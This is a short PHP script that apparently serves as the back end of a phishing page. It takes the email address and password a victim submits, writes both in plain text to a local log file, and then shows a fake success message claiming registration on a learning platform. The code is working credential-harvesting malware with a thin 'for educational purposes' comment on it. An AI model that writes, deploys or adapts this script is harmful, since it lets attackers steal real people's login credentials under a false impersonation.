<?php
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Log the captured data (for educational purposes)
    $file = fopen("log.txt", "a");
    fwrite($file, "Email: $email | Password: $password\n");
    fclose($file);
    
    // echo "Login failed. Please try again.";

?>

<h1>you have successfully registered in great learning </h1>

<?php

?>
